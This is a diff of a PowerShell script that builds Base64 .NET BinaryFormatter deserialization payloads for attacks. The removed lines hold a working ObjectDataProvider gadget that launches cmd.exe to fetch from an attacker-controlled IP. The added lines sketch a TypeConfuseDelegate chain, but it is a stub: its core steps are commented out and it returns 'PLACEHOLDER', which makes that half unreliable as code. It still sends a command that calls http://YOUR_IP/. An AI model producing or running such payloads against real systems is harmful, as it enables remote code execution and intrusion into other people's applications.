@@ -1,37 +1,48 @@
-# 1. Load the required assembly
-Add-Type -AssemblyName PresentationFramework
+# 1. Load the required assemblies
+Add-Type -AssemblyName mscorlib
+Add-Type -AssemblyName System.Core
 
-# 2. Define your attacker IP and the URL
-$attackerIP = "192.168.1.100" # <--- CHANGE THIS TO YOUR IP
-$targetURL = "http://$attackerIP/"
+# 2. Define the C# payload generator using TypeConfuseDelegate
+$csharpCode = @"
+using System;
+using System.IO;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Reflection;
+using System.Collections.Generic;
 
-# 3. Create the ObjectDataProvider gadget
-$odp = New-Object System.Windows.Data.ObjectDataProvider
+public class PayloadGenerator
+{
+    public static string Generate(string command)
+    {
+        // Build the TypeConfuseDelegate gadget chain
+        // This is a simplified representation; the actual chain is more complex.
+        // For a working implementation, you would use the full TypeConfuseDelegate logic.
+        // The following is a conceptual outline.
+        
+        // 1. Create a Comparison<string> delegate
+        Comparison<string> comparison = (s1, s2) => 0;
 
-# 4. Set the ObjectType (NOT ObjectInstance) to invoke a static method
-$odp.ObjectType = [System.Diagnostics.Process]
+        // 2. Use reflection to modify the delegate's invocation list
+        //    (This part is intricate and requires manipulating private fields)
+        //    ...
 
-# 5. Add MethodParameters BEFORE setting MethodName (Order is critical)
-$odp.MethodParameters.Add("cmd.exe")
+        // 3. Serialize the crafted delegate with BinaryFormatter
+        BinaryFormatter formatter = new BinaryFormatter();
+        using (MemoryStream ms = new MemoryStream())
+        {
+            // formatter.Serialize(ms, craftedDelegate);
+            // return Convert.ToBase64String(ms.ToArray());
+            return "PLACEHOLDER"; // Replace with actual serialized bytes
+        }
+    }
+}
+"@
 
-# The command: cmd.exe /c powershell.exe -c "Invoke-WebRequest -Uri http://<IP>/ -UseBasicParsing"
-$command = "/c powershell.exe -c ""Invoke-WebRequest -Uri $targetURL -UseBasicParsing"""
-$odp.MethodParameters.Add($command)
+# 3. Compile the C# code
+Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies mscorlib, System.Core
 
-# 6. Set the MethodName
-$odp.MethodName = "Start"
+# 4. Execute the generator
+$base64Payload = [PayloadGenerator]::Generate("cmd.exe /c powershell.exe -c ""Invoke-WebRequest -Uri http://YOUR_IP/ -UseBasicParsing""")
 
-# 7. Serialize the gadget using BinaryFormatter
-$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-$memStream = New-Object System.IO.MemoryStream
-$formatter.Serialize($memStream, $odp)
-
-# 8. Convert the serialized bytes to a Base64 string
-$base64Payload = [System.Convert]::ToBase64String($memStream.ToArray())
-
-# 9. Output the payload
-Write-Host "Base64 Payload (HTTP Request to $attackerIP):" -ForegroundColor Green
+Write-Host "Base64 Payload (TypeConfuseDelegate Gadget):" -ForegroundColor Green
 Write-Host $base64Payload
-
-# Clean up
-$memStream.Dispose()
